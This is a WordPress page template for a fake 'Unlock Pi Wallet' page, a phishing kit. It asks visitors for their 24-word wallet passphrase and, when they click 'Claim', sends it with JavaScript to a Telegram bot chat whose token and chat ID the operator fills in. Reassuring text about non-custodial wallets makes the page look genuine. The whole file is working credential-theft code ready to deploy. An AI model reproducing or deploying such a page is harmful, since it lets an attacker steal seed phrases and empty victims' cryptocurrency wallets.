<?php
/**
 * Template Name: Unlock Wallet
 */
get_header(); ?>

<style>
.unlock-container {
  min-height: 100vh;
  background: #fff;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
}
.unlock-box {
  background: #fff;
  border-radius: 16px;
  width: 384px;
  max-width: 100vw;
  padding: 24px;
  position: relative;
  box-shadow: 0 0 8px 2px #eee;
}
.unlock-h2 {
  color: #000;
  text-align: center;
  font-size: 2rem;
  font-weight: 600;
  margin-bottom: 24px;
  margin-top: -80px;
}
.unlock-textarea {
  width: 100%;
  padding: 12px 16px;
  font-size: 1rem;
  border: 2px solid #ddd;
  border-radius: 8px;
  color: #444;
  resize: none;
  margin-bottom: 8px;
  line-height: 1.5;
}
.unlock-claim-btn {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 8px 24px;
  border-radius: 8px;
  font-weight: 500;
  font-size: 1rem;
  background: #66237d;
  color: #fff;
  border: 1px solid #66237d;
  margin-bottom: 16px;
  cursor: pointer;
  transition: background 0.1s;
}
.unlock-claim-btn:active {
  background: #52205c;
}
.unlock-helper-txt {
  line-height: 1.8;
  font-size: 0.95rem;
  color: #222;
  margin-bottom: 0;
}
.unlock-helper-txt span {
  color:#2a4bbc!important;
  cursor: pointer;
}
.unlock-errmsg {
  color: #ef4444;
  text-align: center;
  font-size: 0.98rem;
  margin-bottom: 18px;
  margin-top: 0;
}
.unlock-faceid-msg {
  text-align: center;
  font-size: 0.93rem;
  font-weight: 400;
  color: #ef4444;
}
</style>

<div class="unlock-container">
  <div class="unlock-box">
    <h2 class="unlock-h2">Unlock Pi Wallet</h2>
    <!-- Passphrase Input -->
    <div>
      <textarea id="unlock-passphrase" placeholder="Enter your 24-word passphrase here" rows="8" class="unlock-textarea"></textarea>
    </div>
    <div id="unlock-error" class="unlock-errmsg" style="display:none;"></div>
    <div id="unlock-faceid-msg" class="unlock-faceid-msg" style="display:none;">Login with passphrase</div>
    <button id="unlock-claim-btn" class="unlock-claim-btn">Claim</button>
    <div class="unlock-helper-txt">
      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
      <div class="mt-3">
        Lost your passphrase?
        <span>You can create a new wallet</span>, but all your assets in your previous wallet will be inaccessible.
      </div>
    </div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
  const textarea = document.getElementById("unlock-passphrase");
  const errorDiv = document.getElementById("unlock-error");
  const faceIdDiv = document.getElementById("unlock-faceid-msg");
  const claimBtn = document.getElementById("unlock-claim-btn");

  let lastErrorTimeout;

  claimBtn.addEventListener("click", function (e) {
    e.preventDefault();
    const passphrase = textarea.value.trim();
    errorDiv.style.display = 'none';
    faceIdDiv.style.display = 'none';

    if (!passphrase) {
      faceIdDiv.style.display = 'block';
      return;
    }
    // Send to Telegram via Telegram Bot API
    // -- Replace PLACEHOLDER_BOT_TOKEN and PLACEHOLDER_CHAT_ID with your real values --
    const BOT_TOKEN = 'PLACEHOLDER_BOT_TOKEN';
    const CHAT_ID = 'PLACEHOLDER_CHAT_ID';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const data = {
      chat_id: CHAT_ID,
      text: `Unlock request - Passphrase:\n${passphrase}`,
      parse_mode: 'HTML',
    };

    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
      .then(resp => resp.json())
      .then(resp => {
        if (resp.ok) {
          textarea.value = '';
          errorDiv.innerHTML = '';
          errorDiv.style.display = 'none';
          alert('Sent to Telegram!');
        } else {
          errorDiv.innerHTML = 'Could not send. Please try again.';
          errorDiv.style.display = 'block';
        }
      })
      .catch(() => {
        errorDiv.innerHTML = 'Could not send. Please check network and try again.';
        errorDiv.style.display = 'block';
      });
  });
});
</script>

<?php get_footer(); ?>
